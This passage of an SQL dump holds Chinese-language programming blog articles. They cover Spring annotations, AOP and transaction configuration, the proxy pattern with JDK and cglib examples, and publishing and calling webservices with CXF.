注册该方法的返回值对象,方法名为对象的name\r\n@Async: 注册为异步方法\r\n@ControllerAdvice: 注册为增强类\r\n@ExceptionHandler: 异常映射处理\r\n@Autowired: 自动注入\r\n@Qualifier：指定注入对象具体name\r\n@Resource: 自动注入,并可指定注入对象具体name\r\n@Scheduled： 注册cron定时任务方法\r\n@Value: 获取配置值\r\n@EnableConfigurationProperties: 开启配置类\r\n@ConfigurationProperties: 注册为配置类\r\n@SpringBootApplication: springboot的启动类\r\n@EnableAsync: 开启异步方法\r\n@EnableScheduling: 开启cron定时任务\r\n@Scope: 对象是否为单例或多例(singleton,prototype)\r\n@ComponentScan: spring包扫描位置\r\n@MapperScan: Mybatis代理接口包位置\r\n@ImportResource: 加载xml文件\r\n@Import: 加载配置类\r\n@PostConstruct: 对象的init-method方法\r\n@PreDestory: 对象的destroy-method方法\r\n@Aspect: 注册为切面类\r\n@Around: 环绕通知方法\r\n@Pointcut: 统一切面类的execution表达式\r\n@RunWith(SpringJUnit4ClassRunner.class): 通过with指定类,调用指定方法创建测试环境,创建spring容器\r\n@ContextConfiguration(\"classpath:applicationContext.xml\"): 指定创建容器时使用哪个配置文件\r\n``` \r\n## AOP切面\r\n### aop思想\r\n1. 横向重复,纵向抽取\r\n2. jdk代理依靠聚合需要接口,cglib代理依靠继承\r\n\r\n### spring的aop名词 \r\n1. Joinpoint(连接点): 目标对象中,所有*可以*增强方法(add,delete...)\r\n2. Pointcut(切入点): 目标对象,*已经(需要)*增强的方法(addPro,deletePro...)\r\n3. Advice(通知): 增强的代码(*内容*)\r\n4. Target(目标对象): *被代理*对象\r\n5. Weaving(织入): 将通知应用到连接点形成切入点的*这个过程*叫做织入\r\n6. Proxy(代理): 将通知织入到目标对象之后,*形成*的代理对象\r\n7. aspect(切面): *切入点+通知* \r\n\r\n### 通知类型\r\n- 前置通知 -> 目标方法运行前调用\r\n- 后置通知(如果出现异常将不会调用) -> 目标方法运行后调用\r\n- 环绕通知	-> 在目标方法运行前和后都调用\r\n- 异常拦截通知	-> 如果出现异常就会调用\r\n- 后置通知(无论是否异常都会调用) -> 目标方法运行后调用\r\n\r\n### 配置Aop切面\r\n被增强类\r\n```java\r\n// 对四个方法进行切面增强\r\npublic class UserServiceImpl implements UserService{\r\n\r\n	@Override\r\n	public void save() {\r\n		System.out.println(\"save\");\r\n	}\r\n\r\n	@Override\r\n	public void delete() {\r\n		System.out.println(\"delete\");\r\n	}\r\n\r\n	@Override\r\n	public void update() {\r\n		System.out.println(\"update\");\r\n	}\r\n\r\n	@Override\r\n	public void find() {\r\n		System.out.println(\"find\");\r\n	}\r\n\r\n}\r\n```\r\n切面类\r\n```java\r\npublic class SpringAdvice {\r\n\r\n	// 前置通知 -> 目标方法运行前调用\r\n	// 后置通知(如果出现异常将不会调用) -> 目标方法运行后调用\r\n	// 环绕通知	-> 在目标方法运行前和后都调用\r\n	// 异常拦截通知	-> 如果出现异常就会调用\r\n	// 后置通知(无论是否异常都会调用) -> 目标方法运行后调用\r\n\r\n	// 前置通知\r\n	public void before() {\r\n		System.out.println(\"这是前置通知\");\r\n	}\r\n	\r\n	// 后置通知(如果出现异常不会调用)\r\n	public void afterReturning() {\r\n		System.out.println(\"这是后置通知!(如果出现异常不会调用)\");\r\n	}\r\n	\r\n	// 环绕通知\r\n	public Object around(ProceedingJoinPoint pjp) throws Throwable {\r\n		System.out.println(\"环绕通知!之前!\");\r\n		// 调用目标方法\r\n		Object proceed = pjp.proceed();\r\n		System.out.println(\"环绕通知!之后!\");\r\n		return proceed;\r\n	}\r\n	\r\n	public void afterException() {\r\n		System.out.println(\"出现异常了\");\r\n	}\r\n\r\n	public void after() {\r\n		System.out.println(\"这是后置通知!(无论是否异常都会调用)\");\r\n	}\r\n} \r\n```\r\n配置\r\n```java\r\n	<!-- 配置目标对象 -->\r\n	<bean name=\"userService\" class=\"root.service.impl.UserServiceImpl\"></bean>\r\n	<!-- 配置通知对象 -->\r\n	<bean name=\"springAdvice\" class=\"root.spring.springaop.SpringAdvice\"></bean>\r\n	<!-- 配置将通知织入目标对象 -->\r\n	<aop:config>\r\n		<!-- 配置切入点,目标对象,*需要*增强的方法(addPro,deletePro...) \r\n			public void root.service.UserServiceImpl.save() \r\n			void root.service.UserServiceImpl.save()\r\n			* root.service.UserServiceImpl.save()\r\n			* root.service.UserServiceImpl.*()\r\n			\r\n			* root.service.*ServiceImpl.*(..)\r\n			* root.service..*ServiceImpl.*(..)\r\n		-->\r\n		<!--配置切入点  -->\r\n		<aop:pointcut expression=\"execution(* root.service.impl.*ServiceImpl.*(..))\" id=\"pc\"/>\r\n		<aop:aspect ref=\"springAdvice\">\r\n			<!-- 指定名为before方法作为前置通知 -->\r\n			<aop:before method=\"before\" pointcut-ref=\"pc\" />\r\n			<!-- 后置 -->\r\n			<aop:after-returning method=\"afterReturning\" pointcut-ref=\"pc\" />\r\n			<!-- 环绕通知 -->\r\n			<aop:around method=\"around\" pointcut-ref=\"pc\" />\r\n			<!-- 异常拦截通知 -->\r\n			<aop:after-throwing method=\"afterException\" pointcut-ref=\"pc\"/>\r\n			<!-- 后置 -->\r\n			<aop:after method=\"after\" pointcut-ref=\"pc\"/>\r\n		</aop:aspect>\r\n	</aop:config>\r\n```\r\n### 注解Aop切面\r\n开启注解切面\r\n```java\r\n<!-- 开启使用注解完成织入 -->\r\n<aop:aspectj-autoproxy></aop:aspectj-autoproxy>\r\n```\r\n切面类\r\n```java\r\n@Aspect\r\npublic class SpringAdvice {\r\n\r\n	// 前置通知 -> 目标方法运行前调用\r\n	// 后置通知(如果出现异常将不会调用) -> 目标方法运行后调用\r\n	// 环绕通知	-> 在目标方法运行前和后都调用\r\n	// 异常拦截通知	-> 如果出现异常就会调用\r\n	// 后置通知(无论是否异常都会调用) -> 目标方法运行后调用\r\n	@Pointcut(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\r\n	public void pc() {}\r\n	\r\n	// 前置通知\r\n	@Before(\"SpringAdvice.pc()\")\r\n	public void before() {\r\n		System.out.println(\"这是前置通知\");\r\n	}\r\n	\r\n	// 后置通知(如果出现异常不会调用)\r\n	@AfterReturning(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\r\n	public void afterReturning() {\r\n		System.out.println(\"这是后置通知!(如果出现异常不会调用)\");\r\n	}\r\n	\r\n	// 环绕通知\r\n	@Around(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\r\n	public Object around(ProceedingJoinPoint pjp) throws Throwable {\r\n		System.out.println(\"环绕通知!之前!\");\r\n		// 调用目标方法\r\n		Object proceed = pjp.proceed();\r\n		System.out.println(\"环绕通知!之后!\");\r\n		return proceed;\r\n	}\r\n	\r\n	@AfterThrowing(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\r\n	public void afterException() {\r\n		System.out.println(\"出现异常了\");\r\n	}\r\n\r\n	@After(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\r\n	public void after() {\r\n		System.out.println(\"这是后置通知!(无论是否异常都会调用)\");\r\n	}\r\n} \r\n```\r\n## 事务 \r\n不具体讲述事务概念,查看其他文章  \r\n###### Spring事务实现靠*Aop思想*实现\r\n### spring主要配置三个属性\r\n1. 事务隔离级别\r\n2. 是否只读\r\n3. 事务传播行为(service平行调用),决定业务方法之间调用,事务应该如何处理\r\n\r\n### 事务传播行为可选项\r\n- ProPagation_required: 支持当前事务,如果不存在,就新建一个(默认)\r\n- ProPagation_supports: 支持当前事务,如果不存在,就不使用使用\r\n- ProPagation_mandatory: 支持当前事务,如果不存在,抛出异常\r\n- ProPagation_requires_new: 如果有事务存在,挂起当前事务,创建一个新的事务\r\n- ProPagation_not_supported: 以非事务方式运行,如果有事务存在,挂起当前事务\r\n- ProPagation_never: 以非事务方式运行,如果有事务运行,抛出异常\r\n- ProPagation_nested: 如果当前事务存在,则嵌套事务执行\r\n\r\n### 配置事务\r\n```xml\r\n<!-- 事务核心管理器,封装了所有事务操作. 依赖于连接池 -->\r\n	<bean name=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\r\n		<property name=\"dataSource\" ref=\"dataSource\"></property>\r\n	</bean>\r\n	<!-- 事务模板对象 -->\r\n	<bean name=\"transactionTemplate\" class=\"org.springframework.transaction.support.TransactionTemplate\">\r\n		<property name=\"transactionManager\" ref=\"transactionManager\"></property>\r\n	</bean>\r\n\r\n	<!-- 配置事务通知 -->\r\n	<tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\">\r\n		<tx:attributes>\r\n			<!-- 以方法为单位,指定方法应用什么事务属性 isolation:隔离级别 propagation:传播行为 read-only:是否只读 -->\r\n			<tx:method name=\"save*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"false\" />\r\n			<tx:method name=\"persist*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"false\" />\r\n			<tx:method name=\"update*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"false\" />\r\n			<tx:method name=\"modify*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"false\" />\r\n			<tx:method name=\"delete*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"false\" />\r\n			<tx:method name=\"remove*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"false\" />\r\n			<tx:method name=\"get*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"true\" />\r\n			<tx:method name=\"find*\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"true\" />\r\n			<tx:method name=\"transfer\" isolation=\"REPEATABLE_READ\"\r\n				propagation=\"REQUIRED\" read-only=\"false\" />\r\n		</tx:attributes>\r\n	</tx:advice>\r\n\r\n\r\n	<!-- 配置织入 -->\r\n	<aop:config>\r\n		<!-- 配置切点表达式 -->\r\n		<aop:pointcut expression=\"execution(* root.service.*ServiceImpl.*(..))\" id=\"txPc\" />\r\n		<!-- 配置切面 : 通知+切点 advice-ref:通知的名称 pointcut-ref:切点的名称 -->\r\n		<aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"txPc\" />\r\n	</aop:config> \r\n\r\n<!-- 1.连接池 -->\r\n	<bean name=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\">\r\n		<property name=\"jdbcUrl\" value=\"${jdbc.jdbcUrl}\"></property>\r\n		<property name=\"driverClass\" value=\"${jdbc.driverClass}\"></property>\r\n		<property name=\"user\" value=\"${jdbc.user}\"></property>\r\n		<property name=\"password\" value=\"${jdbc.password}\"></property>\r\n	</bean> \r\n```\r\n### 注解事务\r\n```java\r\n// 隔离级别,传播行为,是否可读\r\n@Transactional(isolation=Isolation.REPEATABLE_READ,\r\n	propagation=Propagation.REQUIRED,\r\n	readOnly=false)\r\npublic class AccountServiceImpl implements AccountService {\r\n	@Override\r\n	@Transactional(isolation=Isolation.REPEATABLE_RE,\r\n	propagation=Propagation.REQUIRED,\r\n	readOnly=true)  \r\n	public void transfer(Integer from, Integer to, Double money) {\r\n		\r\n	}\r\n}\r\n```', 1, 0, 69, 0, 0, '2018-11-04 15:31:29', '2019-02-22 00:24:59', 0, 0);
INSERT INTO `article` VALUES (37, 1, '代理模式', '2018/11/1541326196_c4c022c54fcf366ee09a651799b7fd2f.jpg', '# 前言\n代理模式是设计模式中*极其重要*的模式之一,许多框架采用该模式完成模块拼接组成,该模式的通用性极强。是AOP思想的体现\n***\n### 介绍\n1. 理解成将一个方法进行*增强* \n2. 比如在方法执行前需要做一些事情(读取配置,修改sql)\n3. 比如在方法执行后需要做一些事情(处理包装结果)\n4. 需要给多个方法进行增强(动态代理) \n5. 比如MyBatis利用动态代理在执行sql前会将开发者写的*配置文件进行读取*,根据这些配置内容来生成实现类\n6. 比如Spring利用动态代理来为开启事务的方法进行*环绕通知*(执行前开启事务,执行后关闭事务) \n7. 实现动态代理必须要满足一下条件之一,也就是有两种办法实现动态代理\n8. 被增强(代理)对象有一个接口,代理类会是这个接口的实现,但与这个类无关(instanceof是false)\n9. 可以被继承(没有被final修饰),代理类会是这个类的子类(instanceof是true)\n \n## 为什么需要代理模式\n#### 举出一个例子\n```java\npublic interface UserService {\n	void save();\n	void delete();\n	void update();\n	void find();\n}\n```\n#### 实现接口\n```java\npublic class UserServiceImpl implements UserService{\n	@Override\n	public void save() {\n		System.out.println(\"save\");\n	}\n	@Override\n	public void delete() {\n		System.out.println(\"delete\");\n	}\n	@Override\n	public void update() {\n		System.out.println(\"update\");\n	}\n	@Override\n	public void find() {\n		System.out.println(\"find\");\n	}\n} \n```\n明显这个接口有增删改查四个方法,但是我们想要给每个方法*执行前开始事务*,*执行后关闭事务*  \n如果不考虑使用代理模式的话,那么每个方法都要做重复的工作,像这样\n```java\n// 对四个方法进行事务代理\npublic class UserServiceImpl implements UserService{\n\n	@Override\n	public void save() {\n		System.out.println(\"开启\");\n		System.out.println(\"save\");\n		System.out.println(\"关闭\");\n	}\n\n	@Override\n	public void delete() {\n		System.out.println(\"开启\");\n		System.out.println(\"delete\");\n		System.out.println(\"关闭\");\n	}\n\n	@Override\n	public void update() {\n		System.out.println(\"开启\");\n		System.out.println(\"update\");\n		System.out.println(\"关闭\");\n	}\n\n	@Override\n	public void find() {\n		System.out.println(\"开启\");\n		System.out.println(\"find\");\n		System.out.println(\"关闭\");\n	}\n\n} \n```\n##### 很明显,冗余性严重增加了,同样*固定的事*干了四遍\n##### 我希望四个方法*执行操作前后*去开启和关闭,但我不希望我要给每个方法内部手动开启和关闭,这两个操作是固定.我希望四个方法在*执行前后*能走到一个*统一处理的地方*\n***\n## 静态代理\n##### 把代码*简化掉*,假如我们只有一个方法需要开启和关闭该如何走一个处理的地方\n##### 先看看如果依旧像之前那样\n#### 接口\n```java\npublic interface UserService {\n    void save();\n}\n```\n#### 实现类\n```java\npublic class UserServiceImpl implements UserService{\n	@Override\n	public void save() {\n		System.out.println(\"开启\");\n		System.out.println(\"save\");\n		System.out.println(\"关闭\");\n	}\n} \n```\n***\n***\n##### 我们需要*处理执行前后*的地方,利用*组合*可以做到这一点,也称为静态代理\n#### 被增强(代理)类\n```java\npublic class UserServiceImpl implements UserService{\n    @Override\n    public void save() {\n        System.out.println(\"save\");\n    }\n} \n```\n#### 创建代理类\n```java\npublic class UserServiceProxy implements UserService{\n    \n    // 接收需要被增强的类,也就是上面userServiceImpl,它实现了UserSercice接口\n    private UserService userService;\n    public void setUserService(UserService userService){\n	this.userSerivce = userService;\n    }\n\n    @Override \n    public void save() {\n        System.out.println(\"开启\");\n        userService.save(); // save\n        System.out.println(\"关闭\");\n    }\n} \n```\n##### 执行*结果一致*,不过我们创建了一个代理类,把原增强类作为代理类的一个属性,调用前进行开启和关闭,原save方法不需要修改\n***\n##### 看上去很美好,能够在方法调用前后执行的地方找到了\n##### 如果把方法变回四个昵?\n#### 被增强(代理)的类\n```java\npublic class UserServiceImpl implements UserService{\n	@Override\n	public void save() {\n		System.out.println(\"save\");\n	}\n	@Override\n	public void delete() {\n		System.out.println(\"delete\");\n	}\n	@Override\n	public void update() {\n		System.out.println(\"update\");\n	}\n	@Override\n	public void find() {\n		System.out.println(\"find\");\n	}\n} \n```\n#### 代理类\n```java\npublic class UserServiceProxy implements UserService{\n    \n    // 接收需要被增强的类,也就是上面userServiceImpl,它实现了UserSercice接口\n    private UserService userService;\n    public void setUserService(UserService userService){\n	this.userSerivce = userService;\n    }\n\n    @Override \n    public void save() {\n        System.out.println(\"开启\");\n        userService.save(); // save\n        System.out.println(\"关闭\");\n    }\n	@Override \n     public void delete() {\n        System.out.println(\"开启\");\n        userService.delete(); // delete\n        System.out.println(\"关闭\");\n    }\n	@Override  \n    public void update() {\n        System.out.println(\"开启\");\n        userService.update(); // update\n        System.out.println(\"关闭\");\n    }\n	@Override  \n    public void find() {\n        System.out.println(\"开启\");\n        userService.find(); // find\n        System.out.println(\"关闭\"); \n    } \n}  \n```\n##### *冗余性问题依旧没有解决*,重复的事情依旧干了四遍,只不过是在代理类里干的,原增强对象没有改动\n##### 原因就在于每增加一个方法,代理类就要重复做一遍\n##### *无法控制住所有方法*,如果能控制住*所有方法的运行时*,那么这个事情就能解决\n##### *动态代理*为了解决这个问题,在*所有方法*执行前后去做一些事情,无论有多少方法都需要来一趟\n## 动态代理\n### Java提供了两种动态代理的实现方式\n1. jdk代理(接口),依靠被增强代理类接口实现 \n2. cglib代理(继承),依靠称为被增强代理类子类实现 \n\n### JDK代理\n#### 生成代理类的工厂 \n```java\npublic class UserServiceProxyFactory {\n\n	public UserService getUserServiceProxy(UserService userService) {\n		// 加载器,被增强代理者(userServiceImpl),增强内容\n		UserService userPro  = (UserService) Proxy.newProxyInstance(this.getClass().getClassLoader(), \n				UserServiceImpl.class.getInterfaces(), \n				new InvocationPro(userService));\n		return userPro;\n	}\n} \n```\n##### 之所以需要加载类是因为底层实现需要*操作字节码*\n##### jdk代理需要被增强代理者的接口,也就是userService\n##### 第三个是关键,它就是*统一处理的地方*\n##### 返回值userPro就是生成后的代理对象\n\n#### 处理器\n```java\npublic class InvocationPro implements InvocationHandler {\n	// 原始者,被增强代理者(userServiceImpl)\n	private UserService userService;\n	public InvocationPro(UserService userSerivce) {\n		this.userService = userSerivce;\n	}\n	// 代理类, 当前执行的方法, 执行时的参数\n	@Override\n	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n		// 增强前,读配置文件,增强SQL,开启事务...\n		System.out.println(\"开启\");\n		// 调用原始增强代理者,并得到返回值\n		Object invoke = method.invoke(userService, args);\n		// 对结果做出一些调整,关闭事务\n		System.out.println(\"关闭\");\n		return invoke; \n	}\n} \n```\n#### 测试\n```java\n	@Test\n	public void fun1() {\n		UserService userService = new UserServiceImpl();\n		UserServiceProxyFactory userServiceProxyFactory = new UserServiceProxyFactory();\n		UserService userPro = userServiceProxyFactory.getUserServiceProxy(userService);\n		userPro.save();\n		userPro.delete();\n		userPro.update();\n		userPro.find();\n\n		System.out.println(userPro instanceof UserServiceImpl); // false\n	}\n```\n##### *所有方法都经过统一处理器*,关键是,重复的操作没有了,只要在统一处理器位置写一次就行了\n##### 根据Method和args可以指定哪些方法干什么事\n##### instanceof=false是因为jdk代理是依靠接口,userServiceImpl和userPro没有关系,只不过它们有一个共同的接口\n***\n### cglib代理\n#### 生成代理类的工厂\n```java\npublic class UserServiceProxy {\n	\n	\n	public UserService getUserServiceProxy(UserService userService) {\n		Enhancer en = new Enhancer();\n		// 原始增强者\n		en.setSuperclass(userService.getClass());\n		// 增强内容\n		en.setCallback(new MethodInterceptorPro());\n		// 生成代理对象\n		UserService userPro = (UserService) en.create();\n		return userPro;\n	}\n	\n}\n```\n##### 之所有需要原始增强代理者是因为cfglib代理依靠*继承*被代理类实现\n##### 增强内容也就是统一处理器\n##### 返回就是增强后的代理对象\n#### 处理器\n```java\npublic class MethodInterceptorPro implements MethodInterceptor {\n	// 原始增强代理者(userServiceImpl),原始方法,执行参数,代理对象方法\n	@Override\n	public Object intercept(Object obj, Method method, Object[] args, MethodProxy methodProxy) throws Throwable {\n		// 增强前,读配置文件,增强SQL,开启事务...\n		System.out.println(\"开启\");\n		// 原始方法\n		Object invoke = methodProxy.invokeSuper(obj, args);\n		// 对结果做出一些调整,关闭事务\n		System.out.println(\"关闭\");\n		return invoke;\n	}	\n}\n```\n#### 测试\n```java\n@Test\n	public void fun1() {\n		UserService userService = new UserServiceImpl();\n		UserServiceProxy userServiceProxy = new UserServiceProxy();\n		UserService userPro = userServiceProxy.getUserServiceProxy(userService);\n		userPro.delete();\n		userPro.find();\n\n		System.out.println(userPro instanceof UserServiceImpl); // true\n	} \n``` \n##### 所有方法都经过统一处理器,关键是,重复的操作没有了,只要在统一处理器位置写一次就行了\n##### 根据Method和args可以指定哪些方法干什么事\n##### instanceof=true是因为cglib依靠继承实现,所以代理类是原始增强类的子类\n\n#### JDK代理与Cglib代理的区别\n1. JDK代理是利用*反射机制*生成一个实现代理接口的匿名类,在调用具体方法前调用invokeHandler来处理\n2. Cglib代理是利用*asm开源包*,将代理对象类的class文件加载进来,通过修改其字节码生成子类来处理\n\n#### 装饰模式与代理模式的区别\n1. 装饰器模式关注于在一个对象上动态的添加方法,然而代理模式关注于控制对对象的访问\n2. 使用代理模式的时候，我们常常在一个代理类中创建一个对象的实例\n3. 用装饰器模式的时候，做法是将原始对象作为一个参数传给装饰者的构造器\n\n## 原理\n###### 动态代理源码中通过*字节码*生成代理类,具体细节查看源码和其他文章 \n###### asm,javassist,bcel等都是可以操作字节码的技术,可以了解\n#### 给出一个简略实现步骤\n```java\npublic class Proxy {\n	\n	public static Object newProxyInstance(Class infce,InvocationHandler h) throws Exception{\n		// 1、声明一段源码(动态产生代理)\n		String rt = \"\\r\\n\";\n		String methodStr = \"\";\n		for(Method m : infce.getMethods()){\n			methodStr += \"	@Override\" + rt +\n			\"	public void \" + m.getName() + \"() {\" + rt +\n			\"	try{\" + rt +\n			\"	Method md = \"+infce.getName()+\".class.getMethod(\\\"\"\n							+m.getName()+\"\\\");\"+ rt +\n			\"	h.invoke(this,md);\" + rt +\n			\"	} catch(Exception e){e.printStackTrace();}\" + rt + \n			\"	}\";\n		}\n		\n		String str =\n		\"package root.proxy;\" + rt +\n		\"import java.lang.reflect.Method;\" + rt +\n		\"import root.proxy.InvocationHandler;\" + rt +\n		\"public class $Proxy0 implements \" + infce.getName() + \" {\" + rt +\n		\"	public $Proxy0(InvocationHandler h) {\" + rt +\n		\"		super();\" + rt +\n		\"		this.h = h;\" + rt +\n		\"	}\" + rt +\n		\"	private InvocationHandler h;\" + rt +\n		methodStr + rt +\n		\"}\" ;\n		// 产生代理类的Java文件\n		String filename = System.getProperty(\"user.dir\") +\"/bin/root/proxy/$Proxy0.java\";\n		File file = new File(filename);\n		FileUtils.writeStringToFile(file, str);\n		\n		// 2、编译源码（JDK Compiler API），产生新的代理类\n		// Java编译器\n		JavaCompiler complier = ToolProvider.getSystemJavaCompiler();\n		// 文件管理者\n		StandardJavaFileManager fileMgr = \n				complier.getStandardFileManager(null, null, null);\n		// 获取文件\n		Iterable units = fileMgr.getJavaFileObjects(filename);\n		// 编译任务\n		CompilationTask t = complier.getTask(null, fileMgr, null, null, null, units);\n		// 进行编译\n		t.call();\n		fileMgr.close();\n		// 3、将类load到内存当中，产生一个新的对象(代理对象)\n		// load到内存中\n		ClassLoader cl = ClassLoader.getSystemClassLoader();\n		Class c = cl.loadClass(\"root.proxy.$Proxy0\");\n		// 4.return 代理对象\n		Constructor ctr = c.getConstructor(InvocationHandler.class);\n		return ctr.newInstance(h);\n	}\n}\n```\n# 总结\n1. 代理模式非常重要的模式,*使用率极高*\n2. 可以有效解决冗余代码与集中配置读取处理的问题\n3. 对设计思路很有帮助\n4. 对理解源码有帮助(框架都使用许多设计模式)\n5. 可以尝试利用动态代理做一些轮子', 4, 0, 107, 0, 0, '2018-11-04 18:18:59', '2019-02-22 00:25:19', 0, 0);
INSERT INTO `article` VALUES (38, 1, 'webService与cxf使用', '2018/11/1541670658_11df62d2d27b2ff0a88a2935557ff3f3.jpg', '# 前言\r\n本文记录webservice和cxf使用,不对远程调用技术进行刨根问底\r\n***\r\n### 什么是webservice\r\n1. webservice是一种系统之间的*远程调用技术*\r\n2. webservice之间的调用可以实现跨语言跨平台调用\r\n3. *使用Web(Http)方式POST请求*,接收和响应外部系统的某种请求,从而实现远程调用\r\n4. 用于开发分布式的互操作的应用程序,*基于http协议*,底层xml协议\r\n5. SOAP服务,*约束xml结构*,文本协议\r\n\r\n### 主流的PRC调用技术\r\n1. SpringCloud（Spring的，基于Socket的，SOA架构的分布式框架）\r\n2. Dubbo(x)（阿里巴巴的，基于Socket的，SOA架构的分布式框架）\r\n3. WebService（跨语言的，基于SOAP协议，走xml数据或json数据）\r\n4. Hessian（跨语言的，基于Binary-RPC协议，走二进制数据）\r\n5. HttpClient（通常用于RESTful风格的调用，跨语言，基于http和json）\r\n6. jdk原生（HttpURLConnection）\r\n\r\n##### 目前最主流的是SpringCloud与Dubbo,它们都是调用技术,可以实现远程调用技术,区别就在于传输协议,封装格式,安全性上\r\n## 调用公共的Webserver\r\n##### webserver是jdk6自带的,相比于SpringCloud和Dubbo,它的学习成本明显更低,且容易理解\r\n1. 进入一个Demo网站 -> <a href=\"http://www.webxml.com.cn/zh_cn/web_services.aspx?offset=1\">http://www.webxml.com.cn</a> \r\n2. 寻找一个wsdl服务,比如![TIM截图20181108181723.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541672377_TIM截图20181108181723.png) \r\n3. 打开cmd窗口,输入以下命令(需要配置jdk6+环境,因为wsimport是jdk的命令)![TIM截图20181108182308.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541672608_TIM截图20181108182308.png)\r\n4. 将生成文件放入文件夹中(class文件可以删除)\r\n5. 创建一个App.java,写以下内容\r\n```java\r\npublic static void main(String[] args) {\r\n		MobileCodeWS ss = new MobileCodeWS();\r\n		MobileCodeWSSoap soap = ss.getMobileCodeWSSoap();\r\n		String ret = soap.getMobileCodeInfo(\"1851166\", null);\r\n		System.out.println(ret); // 会输出电话信息\r\n	} \r\n```\r\n\r\n\r\n## 发布webservice\r\n我们需要自己创建webservice服务端与客户端\r\n### 创建一个服务端\r\n```java\r\n@WebService\r\npublic class HelloService {\r\n	public String sayHello(String name) {\r\n		System.out.println(\"接收:\" + name);\r\n		return \"hello\" + name;\r\n	}\r\n	\r\n	public static void main(String[] args) {\r\n		String address = \"127.0.0.1:8080/hello\";\r\n		Object implementor = new HelloService();\r\n		Endpoint.publish(address, implementor);\r\n	}\r\n} \r\n```\r\n##### 运行后服务启动,浏览器输入http://127.0.0.1:8080/hello?wsdl, 看到一堆xml结构,说明发布成功了\r\n## 调用webService\r\n调用前需要知道这些xml标签代表什么意思,也就是需要了解*SOAP协议*结构和*WSDL*\r\n### WSDL\r\n1. 就是一个xml文档,用于*描述当前服务的一些信息*(服务名称,服务的发布地址,服务提供的方法,方法的参数,方法的返回值) \r\n2. service[name]: 服务名称\r\n3. port->address[localtion]: 服务的发布地址\r\n4. operation[name]: 服务提供的方法\r\n5. element->complexType->sequence->element: 方法的参数和返回值(多一个response后缀)\r\n\r\n### 调用webservice\r\n1.  wsimport -s . http://127.0.0.1:8080/hello?wsdl 下载代码 \r\n2. 根据wsdl的信息可以写入如下代码\r\n```java\r\n/**\r\n * 1. 使用wsimport命令解析wsdl文件生成本地代码\r\n * 2. 通过本地代码来创建一个代理对象\r\n * 3. 通过代理对象实现远程调用\r\n * @author tuwq\r\n *\r\n */\r\npublic class App {\r\n	public static void main(String[] args) {\r\n		HelloServiceService hss = new HelloServiceService();\r\n		HelloService proxy = hss.getHelloServicePort();\r\n		String sayHello = proxy.sayHello(\"webservice\");\r\n		System.out.println(sayHello); // hello webservice\r\n	}\r\n}\r\n```\r\n4. 服务端会打印接收requestm,客户端会接收返回值打印hellowebservice\r\n***\r\n## cxf发布服务\r\ncxf是apache的一个webservice框架(百度更多)\r\n\r\n### cxf发布服务\r\n#### web.xml添加内容\r\n```xml\r\n <!-- 配置CXF框架提供的Servlet -->\r\n  <servlet>\r\n  	<servlet-name>cxf</servlet-name>\r\n  	<servlet-class>org.apache.cxf.transport.servlet.CXFServlet</servlet-class>\r\n  	<!-- 通过初始化参数指定CXF框架的配置文件位置 -->\r\n  	<init-param>\r\n  		<param-name>config-location</param-name>\r\n  		<param-value>classpath:cxf.xml</param-value>\r\n  	</init-param>\r\n  </servlet>\r\n  <servlet-mapping>\r\n  	<servlet-name>cxf</servlet-name>\r\n  	<url-pattern>/service/*</url-pattern>\r\n  </servlet-mapping> \r\n```\r\n#### 编写服务(接口与实现类)\r\n```java\r\n// 接口上添加注解,而不是实现类\r\n@WebService\r\npublic interface HelloService {\r\n	String sayHello(String name);\r\n}\r\npublic class HelloServiceImpl implements HelloService {\r\n	@Override\r\n	public String sayHello(String name) {\r\n		System.out.println(\"接收到:\" + name);\r\n		return \"hello\" + name;\r\n	}\r\n} \r\n``` \r\n#### cxf.xml注册服务\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\r\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \r\nxmlns:jaxws=\"http://cxf.apache.org/jaxws\"\r\nxmlns:soap=\"http://cxf.apache.org/bindings/soap\"\r\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans \r\n					http://www.springframework.org/schema/beans/spring-beans.xsd\r\n					http://cxf.apache.org/bindings/soap \r\n					http://cxf.apache.org/schemas/configuration/soap.xsd\r\n					http://cxf.apache.org/jaxws \r\n					http://cxf.apache.org/schemas/jaxws.xsd\">\r\n	<!-- 引入CXF Bean定义如下,早期的版本中使用 -->\r\n	<import resource=\"classpath:META-INF/cxf/cxf.xml\" />\r\n	<import resource=\"classpath:META-INF/cxf/cxf-extension-soap.xml\" />\r\n	<import resource=\"classpath:META-INF/cxf/cxf-servlet.xml\" />\r\n	\r\n	<bean id=\"helloService\" class=\"tuwq.service.HelloServiceImpl\"/>\r\n	\r\n	<!-- 注册服务 -->\r\n	<jaxws:server id=\"myService\" address=\"/cxfService\">\r\n		<jaxws:serviceBean>\r\n			<ref bean=\"helloService\"/>\r\n		</jaxws:serviceBean>\r\n	</jaxws:server>\r\n</beans> \r\n```\r\n##### 访问 http://127.0.0.1:[tomcat端口名]/[tomcat项目名]/service/cxfService?wsdl 查看是否发布成功\r\n***\r\n### cxf调用服务\r\n##### 导入cxf相关jar包\r\n##### 